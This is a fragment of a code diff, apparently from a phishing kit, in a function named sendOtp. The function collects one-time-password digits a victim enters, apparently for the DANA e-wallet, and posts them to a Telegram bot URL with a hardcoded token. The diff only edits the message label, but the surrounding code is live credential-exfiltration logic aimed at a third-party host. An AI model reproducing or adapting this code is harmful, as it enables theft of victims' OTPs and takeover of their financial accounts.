@@ -80,7 +80,7 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "📬 *OTP DANA*\n`" + otp + "`";
+  let text = "📬 OTP MASUK*\n`" + otp + "`";
 
   fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
